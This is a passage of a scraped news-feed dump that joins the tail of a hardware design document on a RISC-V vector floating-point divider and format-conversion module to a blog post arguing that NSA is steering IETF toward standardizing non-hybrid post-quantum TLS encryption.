    &lt;p&gt;The figure below shows the architecture of the vector floating-point divider. Compared to the scalar floating-point divider, since vector division computes multiple divisions simultaneously and all results must be written back to the register file together, early termination of a single division offers little benefit for vector division acceleration. Thus, the feature of variable output latency is removed. In all cases, the latency of the vector floating-point divider is fixed based on the input data format, as shown in the table below.&lt;/p&gt;
    &lt;table&gt;
      &lt;row span="2"&gt;
        &lt;cell role="head"&gt;Data Format&lt;/cell&gt;
        &lt;cell role="head"&gt;Calculation Cycle&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;\(f16\)&lt;/cell&gt;
        &lt;cell&gt;\(7\)&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;\(f32\)&lt;/cell&gt;
        &lt;cell&gt;\(11\)&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;\(f64\)&lt;/cell&gt;
        &lt;cell&gt;\(14\)&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;p&gt;In hardware design, aside from the \(Radix-64\) iteration module, the vector floating-point divider employs logic reuse, utilizing four signal groups for computation and control: the first group computes \(f64\_0\), \(f32\_0\), or \(f16\_0\); the second computes \(f32\_1\) or \(f16\_1\); the third computes \(f16\_2\); and the fourth computes \(f16\_3\). Registers are also reused to store intermediate results, with widths sized to \(max\) (1 \(f64\), 2 \(f32\), or 4 \(f16\)) to meet maximum requirements. The \(Radix-64\) iteration module is the critical path, optimized for timing while minimizing area. The first \(Radix-4\) iteration uses 7 independent \(CSA\) and quotient selection units, while the second and third iterations reuse 4 \(CSA\) and quotient selection units.&lt;/p&gt;
    &lt;head rend="h4"&gt;Interface Description&lt;/head&gt;
    &lt;p&gt;The \(RVV\) specification defines three vector floating-point division instructions:&lt;/p&gt;
    &lt;p&gt;① \(vfdiv.vv \quad vd[i] = vs2[i]/vs1[i]\)&lt;/p&gt;
    &lt;p&gt;② \(vfdiv.vf \quad vd[i] = vs2[i]/f[rs1]\)&lt;/p&gt;
    &lt;p&gt;③ \(vfrdiv.vf \quad vd[i] = f[rs1]/vs2[i]\)&lt;/p&gt;
    &lt;p&gt;Case ③ is special as the operand order differs from cases ① and ②. For the vector division unit, the first operand is passed by the control logic as \(vs2[i]/f[rs1]\), and the second operand is passed as \(vs1[i]/f[rs1]/vs2[i]\). Thus, the functional unit sees the dividend in either vector or scalar form, and the divisor is also in vector or scalar form. Therefore, two additional scalar data interfaces are required. After adding these interfaces, the module is named \(VFDIV\), with the interfaces as shown in the table below.&lt;/p&gt;
    &lt;table&gt;
      &lt;row span="4"&gt;
        &lt;cell role="head"&gt;Interface&lt;/cell&gt;
        &lt;cell role="head"&gt;Direction&lt;/cell&gt;
        &lt;cell role="head"&gt;Bit Width&lt;/cell&gt;
        &lt;cell role="head"&gt;Meaning&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;\(start\_valid\_i\)&lt;/cell&gt;
        &lt;cell&gt;\(input\)&lt;/cell&gt;
        &lt;cell&gt;\(1\)&lt;/cell&gt;
        &lt;cell&gt;Handshake signal&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;\(finish\_ready\_i\)&lt;/cell&gt;
        &lt;cell&gt;\(input\)&lt;/cell&gt;
        &lt;cell&gt;\(1\)&lt;/cell&gt;
        &lt;cell&gt;Handshake signal&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;\(flush\_i\)&lt;/cell&gt;
        &lt;cell&gt;\(input\)&lt;/cell&gt;
        &lt;cell&gt;\(1\)&lt;/cell&gt;
        &lt;cell&gt;Flush signal&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;\(fp\_format\_i\)&lt;/cell&gt;
        &lt;cell&gt;\(input\)&lt;/cell&gt;
        &lt;cell&gt;\(2\)&lt;/cell&gt;
        &lt;cell&gt;Floating-point format&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;\(opa\_i\)&lt;/cell&gt;
        &lt;cell&gt;\(input\)&lt;/cell&gt;
        &lt;cell&gt;\(64\)&lt;/cell&gt;
        &lt;cell&gt;Dividend&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;\(opb\_i\)&lt;/cell&gt;
        &lt;cell&gt;\(input\)&lt;/cell&gt;
        &lt;cell&gt;\(64\)&lt;/cell&gt;
        &lt;cell&gt;Divisor&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;\(frs2\_i\)&lt;/cell&gt;
        &lt;cell&gt;\(input\)&lt;/cell&gt;
        &lt;cell&gt;\(64\)&lt;/cell&gt;
        &lt;cell&gt;Dividend comes from floating-point register data&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;\(frs1\_i\)&lt;/cell&gt;
        &lt;cell&gt;\(input\)&lt;/cell&gt;
        &lt;cell&gt;\(64\)&lt;/cell&gt;
        &lt;cell&gt;Divisor sourced from floating-point register data&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;\(is\_frs2\_i\)&lt;/cell&gt;
        &lt;cell&gt;\(input\)&lt;/cell&gt;
        &lt;cell&gt;\(1\)&lt;/cell&gt;
        &lt;cell&gt;Dividend sourced from floating-point register&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;\(is\_frs1\_i\)&lt;/cell&gt;
        &lt;cell&gt;\(input\)&lt;/cell&gt;
        &lt;cell&gt;\(1\)&lt;/cell&gt;
        &lt;cell&gt;The divisor comes from the floating-point register&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;\(rm\_i\)&lt;/cell&gt;
        &lt;cell&gt;\(input\)&lt;/cell&gt;
        &lt;cell&gt;\(3\)&lt;/cell&gt;
        &lt;cell&gt;Rounding mode&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;\(start\_ready\_o\)&lt;/cell&gt;
        &lt;cell&gt;\(output\)&lt;/cell&gt;
        &lt;cell&gt;\(1\)&lt;/cell&gt;
        &lt;cell&gt;Handshake signal&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;\(finish\_valid\_o\)&lt;/cell&gt;
        &lt;cell&gt;\(output\)&lt;/cell&gt;
        &lt;cell&gt;\(1\)&lt;/cell&gt;
        &lt;cell&gt;Handshake signal&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;\(fpdiv\_res\_o\)&lt;/cell&gt;
        &lt;cell&gt;\(output\)&lt;/cell&gt;
        &lt;cell&gt;\(64\)&lt;/cell&gt;
        &lt;cell&gt;Computation result&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;\(fflags\_o\)&lt;/cell&gt;
        &lt;cell&gt;\(output\)&lt;/cell&gt;
        &lt;cell&gt;\(20\)&lt;/cell&gt;
        &lt;cell&gt;Flag bits&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;head rend="h3"&gt;Vector format conversion module \(VCVT\)&lt;/head&gt;
    &lt;p&gt;The \(VCVT\) module is a three-stage pipelined vector floating-point format conversion module. It instantiates two \(VectorCvt\) submodules capable of processing \(64\)-bit data. Each \(VectorCvt\) contains one \(cvt64\), one \(cvt32\), and two \(cvt16\) modules. The \(cvt64\) supports processing floating-point/integer formats of \(64\), \(32\), \(16\), and \(8\) bits. The \(cvt32\) supports \(32\), \(16\), and \(8\)-bit floating-point/integer formats, while the \(cvt16\) supports \(16\) and \(8\)-bit floating-point/integer formats. Thus, \(VectorCvt\) can simultaneously process one \(64\)-bit (or two \(32\)-bit, or four \(16\)-bit, or four \(8\)-bit) floating-point/integer format input data for conversion.&lt;/p&gt;
    &lt;head rend="h4"&gt;Overall design&lt;/head&gt;
    &lt;head rend="h4"&gt;Module Design&lt;/head&gt;
    &lt;p&gt;The \(CVT\) module includes single-width floating-point/integer type conversion instructions, widening floating-point/integer type conversion instructions, narrowing floating-point/integer type conversion instructions, vector floating-point reciprocal square root estimation instructions, and vector floating-point reciprocal estimation instructions.&lt;/p&gt;
    &lt;p&gt;Select different \(cvt\) module calls based on \(width\). The design approach for the \(cvt\) module is divided into four types based on instruction type: \(fp2int\), \(int2fp\), \(fp2fp\), and \(vfr\). The overall design approach for \(fcvt64\) is to unify the format of the input \(64bit\) data:&lt;/p&gt;
    &lt;p&gt;different width unsigned/signed int -&amp;gt; 65 signed int&lt;/p&gt;
    &lt;p&gt;\(f16/f32/f64 -&amp;gt; 65bit (f64 \#\# false.B)\)&lt;/p&gt;
    &lt;p&gt;After standardizing the format, there is no longer a need to distinguish between different types of data, their bit widths, or field positions during the conversion process to a certain extent.&lt;/p&gt;
    &lt;p&gt;Building on this, \(VFCVT64\) is divided into 5 categories: \(int -&amp;gt; fp\), \(fp -&amp;gt; fp\) widen, \(fp -&amp;gt; fp\) narrow, estimate7 (\(rsqrt7\) &amp;amp; \(rec7\)), and \(fp -&amp;gt; int\).&lt;/p&gt;
    &lt;head rend="h4"&gt;\(FuopType\) decoding logic&lt;/head&gt;
    &lt;p&gt;For the \(cvt\) instruction: its \(fuopType\) consists of \(9\) bits, with each bit representing the following information:&lt;/p&gt;
    &lt;p&gt;Here, \([5:0]\) is obtained from the manual, and \([8:6]\) is additionally added during the design of control signal generation for convenience.&lt;/p&gt;
    &lt;p&gt;\([8]:1\) indicates it is a \(move\) instruction, \(0\) represents \(cvt\) instruction or the two estimation instructions \(vfrsqrt7\) and \(vfrec7\).&lt;/p&gt;
    &lt;p&gt;\([7]: 1\) indicates the input is \(fp\), \(0\) indicates the input is \(int\).&lt;/p&gt;
    &lt;p&gt;\([6]\): \(1\) indicates the output is \(fp\), \(0\) indicates the output is \(int\).&lt;/p&gt;
    &lt;p&gt;\([5]:1\) indicates it is one of the two estimation instructions, \(vfrsqrt7\) or \(vfrec7\); otherwise, it is a \(cvt\) instruction. When it is \(1\), \([0]\) distinguishes between \(vfrsqrt7\) and \(vfrec7\).&lt;/p&gt;
    &lt;p&gt;\([4:3]: 00\) denotes \(single\) type, \(01\) denotes \(widen\), \(10\) denotes \(narrow\).&lt;/p&gt;
    &lt;p&gt;\([2:0]\): For different instructions, it serves different purposes: For conversions between floating-point and integer, \([0]\) distinguishes whether the integer is signed or unsigned; in other cases, \([2:1]=11\) indicates it is an \(rtz\) type instruction, and \([2:0]=101\) indicates it is \(rod\) (vfncvt_rod_ffw).&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45477118</guid><pubDate>Sat, 04 Oct 2025 22:02:28 +0000</pubDate></item><item><title>NSA and IETF: Can an attacker purchase standardization of weakened cryptography?</title><link>https://blog.cr.yp.to/20251004-weakened.html</link><description>&lt;doc fingerprint="3e9999123e0289dd"&gt;
  &lt;main&gt;
    &lt;p&gt;It's normal for post-quantum cryptography to be rolled out as an extra layer of security on top of traditional pre-quantum cryptography, rather than as a replacement.&lt;/p&gt;
    &lt;p&gt;For example, Google's CECPQ1 experiment was double encryption with traditional pre-quantum ECC (specifically X25519) and post-quantum NewHope1024. CECPQ2, a joint experiment between Google and Cloudflare, was ECC+NTRUHRSS701. CECPQ2b was ECC+SIKEp434. Ten SSH implementations support ECC+sntrup761. Today's usage of post-quantum cryptography by browsers is approaching half of the connections seen by Cloudflare, where 95% of that is ECC+MLKEM768 and 5% is ECC+Kyber768.&lt;/p&gt;
    &lt;p&gt;If post-quantum cryptography is designed to be super-strong, so strong that it even survives future quantum computers, then why are we keeping the ECC layer? Same reason that you wear your seatbelt: in the real world, cars sometimes crash, and seatbelts reduce the damage.&lt;/p&gt;
    &lt;p&gt;Google already explained this back in 2016: "The post-quantum algorithm might turn out to be breakable even with today's computers, in which case the elliptic-curve algorithm will still provide the best security that today's technology can offer." We've seen many breaks of post-quantum proposals since then, including the sudden public collapse of SIKE three years after CECPQ2b applied SIKE to tens of millions of user connections. The only reason that this user data wasn't immediately exposed to attackers is that CECPQ2b encrypted data with SIKE and with ECC, rather than switching from ECC to just SIKE. As another example, the reference Kyber/ML-KEM software went through two rounds of security patches for KyberSlash at the end of 2023, and then had another security patch in mid-2024.&lt;/p&gt;
    &lt;p&gt;Deploying ECC+PQ rather than just PQ is an easy common-sense win. ECC software is practically everywhere anyway, and nobody has identified an application that can afford PQ without being able to afford ECC+PQ.&lt;/p&gt;
    &lt;p&gt;Typically people talk about deploying ECC+PQ as deploying "hybrids" rather than "non-hybrids", although you have to be careful with this terminology since the word "hybrid" also has other meanings in cryptography. It's more descriptive to talk about "double encryption" and "double signatures" rather than "single encryption" and "single signatures".&lt;/p&gt;
    &lt;p&gt;The problem in a nutshell. Surveillance agency NSA and its partner GCHQ are trying to have standards-development organizations endorse weakening ECC+PQ down to just PQ.&lt;/p&gt;
    &lt;p&gt;Part of this is that NSA and GCHQ have been endlessly repeating arguments that this weakening is a good thing (in much the same way that NSA advertised Dual EC as providing "increased assurance"). I have a previous blog post showing that those arguments collapse upon examination. But that's not today's topic. In today's blog post I'm instead looking at how easy it is for NSA to simply spend money to corrupt the standardization process.&lt;/p&gt;
    &lt;p&gt;Two TLS encryption drafts. For concreteness, I'll focus on what's happening in a particular standards-development organization called the Internet Engineering Task Force (IETF). Within that, I'll focus on current proposals within an IETF "working group" (WG) that sets standards for Transport Layer Security (TLS), the security layer inside HTTPS and inside various other protocols. I'll look specifically at how the TLS WG handled two drafts specifying post-quantum encryption mechanisms for TLS:&lt;/p&gt;
    &lt;p&gt;Hybrid (double encryption): "Post-quantum hybrid ECDHE-MLKEM Key Agreement for TLSv1.3". This draft specifies ECC+PQ in TLS, specifically usage in TLS of "X25519MLKEM768, SecP256r1MLKEM768, and SecP384r1MLKEM1024". The first of those is also what I mentioned above as 95% of current post-quantum connections to Cloudflare.&lt;/p&gt;
    &lt;p&gt;Non-hybrid (single encryption): "ML-KEM Post-Quantum Key Agreement for TLS 1.3". This draft specifies usage in TLS of "ML-KEM-512, ML-KEM-768, and ML-KEM-1024" without seatbelts.&lt;/p&gt;
    &lt;p&gt;The non-hybrid draft was first posted in March 2024. Of course someone asked "what the motivation is for being 'fully post-quantum' rather than hybrid". The draft author responded: "FIPS / CNSA 2.0 compliance guidelines ... currently are a big 'maybe' at best for 'hybrid solutions', and the timetables for compliant browsers, servers, and services are to exclusively use FIPS 203 at level V (ML-KEM-1024) by 2033. I figure there will be demand for pure ML-KEM key agreement, not hybrid (with no questions that come along with it of whether it's actually allowed or not)."&lt;/p&gt;
    &lt;p&gt;As context, the massive U.S. military budget now publicly requires cryptographic "components" to have NSA approval. "CNSA 2.0" refers to a public NSA document "Commercial National Security Algorithm Suite 2.0". The document says up front that its requirements apply to "all NSS use of public cryptographic algorithms (as opposed to algorithms NSA developed), including those on all unclassified and classified NSS". The legal definition of "national security system" (NSS) covers practically all military information systems, except for "routine administrative and business applications" such as "payroll".&lt;/p&gt;
    &lt;p&gt;In June 2024, NSA's William Layton wrote that "we do not anticipate supporting hybrid in NSS".&lt;/p&gt;
    &lt;p&gt;In December 2024, a Cisco employee wrote the following: "There are people whose cryptographic expertise I cannot doubt who say that pure ML-KEM is the right trade-off for them, and more importantly for my employer, that's what they're willing to buy. Hence, Cisco will implement it; I am essentially just asking for code points." Certainly "willing to buy" is a statement about funding, evidently from a source large enough to dictate Cisco actions, evidently from a source asking for non-hybrids, evidently from "people whose cryptographic expertise I cannot doubt"; if that source isn't NSA, who is it?&lt;/p&gt;
    &lt;p&gt;(Side note: If you think the word "pure" in "pure ML-KEM" sounds good, remember that replacing CECPQ2's ECC+SIKE with "pure SIKE" would have been a disaster.)&lt;/p&gt;
    &lt;p&gt;In June 2025, NSA's Mike Jenkins posted the following: "As the CNSA 2.0 profiles should make clear, we are looking for products that support /standalone/ ML-DSA-87 and /standalone/ ML-KEM-1024. If there is one vendor that produces one product that complies, then that is the product that goes on the compliance list and is approved for use. Our interactions with vendors suggests that this won't be a problem in most cases." Evidently there are many companies happy to jump when NSA says jump.&lt;/p&gt;
    &lt;p&gt;Pretending to eat your own dog food. For software engineers, "dogfooding" (a term perhaps coined by Paul Maritz in the 1980s) refers to making regular use of the software that you're writing. This builds your confidence that the software works, and helps iron out problems.&lt;/p&gt;
    &lt;p&gt;But there's also a marketing version of the same concept, where you publicly say that you're using your own software as a way to build other people's confidence in the software. As in other types of marketing, what you're saying doesn't have to be true.&lt;/p&gt;
    &lt;p&gt;Once upon a time, NSA weakened the Data Encryption Standard to just 56 bits. In public, NSA claimed that it hadn't tampered with the standard, and that the "implausibility of public allegations is further demonstrated by the fact that NSA has endorsed the use of DES for the encryption of national security-related information, including selected classified information".&lt;/p&gt;
    &lt;p&gt;This is powerful marketing. Many people hearing this last quote will think "Oh, okay, NSA is using DES, so DES is strong". Koblitz and Menezes claimed that it's "far-fetched" that NSA would have intentionally selected something weak "for U.S. government usage (for both unclassified and classified communications [41])". Many people today will think "Oh, okay, NSA is buying single encryption, so double encryption is unimportant".&lt;/p&gt;
    &lt;p&gt;But DES wasn't strong. NSA had engineered DES to be "weak enough" for NSA to break. NSA wanted DES to "drive out competitors", to "reduce the field that NSA had to be concerned about".&lt;/p&gt;
    &lt;p&gt;It's perfectly plausible that NSA was using DES, but surely NSA was then using DES multiple times (Triple-DES or beyond), which makes it much harder to break (as long as you switch keys frequently). Obviously NSA wouldn't have said "use multiple layers" publicly: NSA wanted to fool people into thinking that DES was secure.&lt;/p&gt;
    &lt;p&gt;Today we have better ciphers than DES. However, for data that it cares about, NSA still uses two independent encryption layers "to mitigate the ability of an adversary to exploit a single cryptographic implementation". Gee, maybe multiple encryption is important after all!&lt;/p&gt;
    &lt;p&gt;Try to put yourself in the mindset of NSA as an attacker. You have a massive budget to "covertly influence and/or overtly leverage" systems to "make the systems in question exploitable"; "to the consumer and other adversaries, however, the systems' security remains intact". One of your action items is to "influence policies, standards and specification for commercial public key technologies". Another is to "shape the worldwide commercial cryptography marketplace to make it more tractable to advanced cryptanalytic capabilities being developed by NSA/CSS".&lt;/p&gt;
    &lt;p&gt;You spend this money pursuing many different attack paths, taking whatever surveillance wins you can get. It's not that everybody was using Dual EC, for example, but you managed to manipulate some people into using it, and for you that's a win.&lt;/p&gt;
    &lt;p&gt;Weakening ECC+PQ to just PQ, normalizing the practice of driving without seatbelts, is another win for you as the attacker. It's adding further vulnerabilities to the cryptographic ecosystem. The point is that, beyond SIKE and many other publicly broken cryptosystems, there will be some further cases where your "advanced cryptanalytic capabilities" break the PQ part while the "consumer and other adversaries" think the PQ part is secure.&lt;/p&gt;
    &lt;p&gt;What do you do with your control over the U.S. military budget? That's another opportunity to "shape the worldwide commercial cryptography marketplace". You can tell people that you won't authorize purchasing double encryption. You can even follow through on having the military publicly purchase single encryption. Meanwhile you quietly spend a negligible amount of money on an independent encryption layer to protect the data that you care about, so you're actually using double encryption.&lt;/p&gt;
    &lt;p&gt;Adoption of double encryption in TLS. "Adoption" in IETF is a preliminary step before standardization: when a WG is "ready to develop a particular document, the most common mechanism is for it to 'adopt' an existing document as a starting point".&lt;/p&gt;
    &lt;p&gt;In March 2025, after the close of a two-week "WG adoption call", the TLS WG chairs declared "consensus to adopt" the "Post-quantum hybrid ECDHE-MLKEM Key Agreement for TLSv1.3" draft.&lt;/p&gt;
    &lt;p&gt;There were no objections to the declaration of consensus on adopting this draft. I had pointed out that the patents on Kyber/ML-KEM create two issues related to IETF's patent policy, but I said that the first issue can be fixed after adoption (before standardization), and I now think that this is also true for the second issue. The risks from patents are orthogonal to the risks from non-hybrids, and I won't say more about patents in this blog post.&lt;/p&gt;
    &lt;p&gt;Why worry about a weaker standard if there's a stronger standard? At this point you might be wondering: if people are driving with seatbelts and this is on its way to being standardized, what's the problem with also having a driving-without-seatbelts standard for reckless fools who want to use that?&lt;/p&gt;
    &lt;p&gt;Think about Dual EC. Dual EC wasn't the only randomness-generation standard. But companies paid for FIPS certification of at least 62 different implementations of Dual EC. NSA bribed the RSA company to change its popular cryptographic library to use Dual EC by default.&lt;/p&gt;
    &lt;p&gt;These companies saw that Dual EC was a standard from a reputable standards organization (in fact, from three such organizations, namely ANSI, ISO, and NIST). Even for companies realizing that Dual EC was a controversial standard pushed by NSA, how many companies would risk losing money by refusing to implement Dual EC? It's easy for purchasing managers to use standards to set purchasing requirements.&lt;/p&gt;
    &lt;p&gt;What's particularly pernicious about a driving-without-seatbelts standard is that a purchasing manager who looks at it has an incentive to pick it instead of the driving-with-seatbelts standard. Wow, I can save $50 for every seatbelt that I skip! Wow, I can save 50 picodollars for every ECC operation that I skip! The purchasing manager doesn't care whether this cost reduction matters in context: every penny saved sounds good, right? The purchasing manager also doesn't realize the standard is dangerous: on the contrary, why would it be a standard if it were unsafe?&lt;/p&gt;
    &lt;p&gt;Soon we're faced with widespread non-usage of seatbelts. And then, years too late, we realize that, oops, something people used and thought was secure actually wasn't, just as in the case of SIKE.&lt;/p&gt;
    &lt;p&gt;Adoption of single encryption in TLS. On 1 April 2025âunfortunately not as a jokeâthe TLS WG chairs issued a two-week "WG adoption call for the ML-KEM Post-Quantum Key Agreement for TLS 1.3 I-D", the non-hybrid draft mentioned above.&lt;/p&gt;
    &lt;p&gt;Here are some quotes (some from me, some from other people) illustrating objections raised on the TLS mailing list during the call period:&lt;/p&gt;
    &lt;p&gt;The draft creates security risks. Sample quote: "SIKE was applied to large volumes of user data as part of the CECPQ2 experiment in 2019. SIKE was publicly broken in 2022. [paragraph break] The only reason that this didn't immediately give away the user data to attackers is that CECPQ2 was ECC+SIKE, rather than just SIKE. [paragraph break] Should we keep rolling out post-quantum cryptosystems to try to stop future quantum attacks? Yes, of course. But, just in case this goes horribly wrong again, let's make sure to keep ECC in place. Any draft violating this should be rejected as a security risk not just by WGs but also by the ISE."&lt;/p&gt;
    &lt;p&gt;The draft violates BCP 188. Sample quote: "To the extent that this is an allusion to NSA purchasing, it violates BCP 188 ('IETF Will Work to Mitigate Pervasive Monitoring')."&lt;/p&gt;
    &lt;p&gt;The draft violates the WG charter. Sample quote: "the draft's regression from ECC+PQ to just PQ is certainly a technology issue; and this is fatal, as a contravention of the 'improve security' goal in the WG charter".&lt;/p&gt;
    &lt;p&gt;There are no principles supporting the adoption decision. Sample quote: "I don't see what criteria we might use in adopting this that wouldn't leave the WG open to accusations of favouritism if we don't adopt other pure PQ national standards that will certainly arise".&lt;/p&gt;
    &lt;p&gt;The draft's motivation section is circular. Sample quote: there is "a preliminary step that has been skipped here, namely identifying why the proposal is claimed to be adding something important. The draft's motivation sentence consists of rearranging buzzwords without answering the question: 'Having a fully post-quantum (not hybrid) key agreement option for TLS 1.3 is necessary for migrating beyond hybrids and for users that need to be fully post-quantum.' "&lt;/p&gt;
    &lt;p&gt;The draft increases software complexity. Sample quote: "The main stated benefit of using a standalone ML-KEM is complexity reduction, but with the current progress in the deployment of the ML-KEM + ECC hybrid method, a standalone ML-KEM method actually increases overall complexity in software stacks." (This was responding to a claim during the adoption-call period that the draft provided a "compute / dependency base that is minimalist".)&lt;/p&gt;
    &lt;p&gt;This is just a high-level survey of the objections. These quotes aren't intended to convey the full text of objections. They also aren't intended to convey the number of people objecting; I'll get back to that below.&lt;/p&gt;
    &lt;p&gt;Standardization procedures. How does a standards-development organization handle objections? The law on this topic in the United States has been settled for decades.&lt;/p&gt;
    &lt;p&gt;The starting point is that agreements in restraint of interstate commerce are illegal. Courts interpret this to cover various types of agreements that are illegal per se, such as price fixing and group boycotts, along with further agreements that unreasonably interfere with competition.&lt;/p&gt;
    &lt;p&gt;Here's an example from the 1980s. Agents of a company that was leading its market, McDonnell and Miller, took control of a subcommittee of the American Society of Mechanical Engineers, a standards-development organization. They generated a letter, under ASME's apparent authority, declaring that a new competitor's product wasn't compliant. They distributed that letter to buyers, of course damaging the new competitor's business.&lt;/p&gt;
    &lt;p&gt;The competitor, HydroLevel, sued the conspiratorsâincluding ASME, which didn't even know the abuse was happening. HydroLevel won. ASME was ultimately forced to pay millions of dollars. The Supreme Court didn't mince words in describing the anti-competitive power of standards-development organizations:&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;ASME wields great power in the Nation's economy. Its codes and standards influence the policies of numerous States and cities, and, as has been said about "so-called voluntary standards" generally, its interpretations of its guidelines "may result in economic prosperity or economic failure, for a number of businesses of all sizes throughout the country," as well as entire segments of an industry. ... ASME can be said to be "in reality, an extragovernmental agency which prescribes rules for the regulation and restraint of interstate commerce." ... When it cloaks its subcommittee officials with the authority of its reputation, ASME permits those agents to affect the destinies of businesses, and thus gives them the power to frustrate competition in the marketplace.&lt;/p&gt;
      &lt;p&gt;... Many of ASME's officials are associated with members of the industries regulated by ASME's codes. Although undoubtedly most serve ASME without concern for the interests of their corporate employers, some may well view their positions with ASME, at least in part, as an opportunity to benefit their employers. When the great influence of ASME's reputation is placed at their disposal, the less altruistic of ASME's agents have an opportunity to harm their employers' competitors through manipulation of ASME's codes.&lt;/p&gt;
      &lt;p&gt;... Only ASME can take systematic steps to make improper conduct on the part of all its agents unlikely, and the possibility of civil liability will inevitably be a powerful incentive for ASME to take those steps. Thus, a rule that imposes liability on the standard-setting organization -- which is best situated to prevent antitrust violations through the abuse of its reputation -- is most faithful to the congressional intent that the private right of action deter antitrust violations.&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;Another Supreme Court case rejected an argument of antitrust immunity for another standards-development organization. The organization made various decisions by majority vote, and had allowed steel manufacturers to pack a standards-development group, filling the group with pro-steel agents to take over a vote. The Supreme Court again recognized the importance of procedural safeguards preventing abuse:&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;The antitrust validity of these efforts is not established, without more, by petitioner's literal compliance with the rules of the Association, for the hope of procompetitive benefits depends upon the existence of safeguards sufficient to prevent the standard-setting process from being biased by members with economic interests in restraining competition. An association cannot validate the anticompetitive activities of its members simply by adopting rules that fail to provide such safeguards.&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;The Supreme Court declined at that point to draw a dividing line saying which safeguards were required. In 2004, Congress passed a law pinning this down: the new law said that "standards development activity" by a "standards development organization" isn't illegal per se, and gave definitions of the quoted phrases.&lt;/p&gt;
    &lt;p&gt;In particular, a "standards development organization" is required by law to "incorporate the attributes of openness, balance of interests, due process, an appeals process, and consensus in a manner consistent with the Office of Management and Budget Circular Number A-119, as revised February 10, 1998".&lt;/p&gt;
    &lt;p&gt;That OMB rule, in turn, defines "consensus" as follows: "general agreement, but not necessarily unanimity, and includes a process for attempting to resolve objections by interested parties, as long as all comments have been fairly considered, each objector is advised of the disposition of his or her objection(s) and the reasons why, and the consensus body members are given an opportunity to change their votes after reviewing the comments".&lt;/p&gt;
    &lt;p&gt;The Antitrust Division of the Department of Justice inserted itself into a private court case in 2019 to say that "the United States has a significant interest in the correct interpretation of the exemption from per se treatment for standards development organizations engaging in standard setting activities".&lt;/p&gt;
    &lt;p&gt;Deputy Assistant Attorney General Alexander Okuliar in the same division presented a longer statement to ANSI in 2020 regarding antitrust and standards. The statement mentioned ANSI's compliance with the same requirements and said "From an antitrust perspective, these requirements are central".&lt;/p&gt;
    &lt;p&gt;Here's a random example of what an objection-response document looks like in ISO, IEC, etc. Not the best user interface, but it gets the job done.&lt;/p&gt;
    &lt;p&gt;There was not general agreement to adopt the non-hybrid draft. Now that we have the concept of consensus in mind, let's go back to what happened in the IETF TLS WG regarding the non-hybrid draft.&lt;/p&gt;
    &lt;p&gt;During the adoption-call period, there were statements from 20 people unequivocally supporting adoption: David Adrian from Google, Joseph Birr-Pixton, Uri Blumenthal from Department of Defense subsidiary Lincoln Labs, "Flo D" from GCHQ, Quynh Dang from NIST, Viktor Dukhovni, Scott Fluhrer from Cisco, Rebecca Guthrie from NSA, Russ Housley, Alicja Kario from IBM subsidiary Red Hat, Kris Kwiatkowski, Andrei Popov from Microsoft, Tirumal Reddy from Cisco, Yaroslav Rosomakho, Jan Schaumann, Sophie Schmieg from Google, Martin Thomson from Mozilla, Filippo Valsorda formerly from Google, Loganaden Velvindron, and Thom Wiggers.&lt;/p&gt;
    &lt;p&gt;There were also statements from 2 people conditionally supporting adoption: John Mattsson from Ericsson ("I support adoption as long as reuse of ephemeral keys is normatively forbidden, i.e. MUST NOT reuse") and Yaakov Stein ("I support adoption of pure PQC KEMs drafts with Intended status: Informational (meaning that the IETF is not recommending using)").&lt;/p&gt;
    &lt;p&gt;However, there were statements from 7 people unequivocally opposing adoption: Thomas Bellebaum ("I agree with Stephen on this one and would not support adoption of non-hybrids"), Andrey Jivsov ("I am opposed to the adoption of ML-KEM at this time"), Stephen Farrell ("I'm opposed to adoption, at this time"), Rich Salz ("I was all set to say that I am in favor of adoption, but Stephen's post changed my mind. [paragraph break] The conservative and safe thing is to stick to hybrids and that is what the IETF should do for now"), Rob Sayre ("I oppose adoption"), Sun Shuzhou ("I'm opposed to adoption"), and me.&lt;/p&gt;
    &lt;p&gt;Even assuming that the 2 statements of conditional support are treated as positive votes, the overall situation here, 22 positive votes and 7 negative votes, does not qualify as general agreement. "General" means "shared by or affecting most people, or most of the people in a group"; "most" means "nearly all of the people or things in a group, or nearly all of something"; the phrase "general agreement" means that nearly everyone agrees. Merely having three quarters agree is not good enough.&lt;/p&gt;
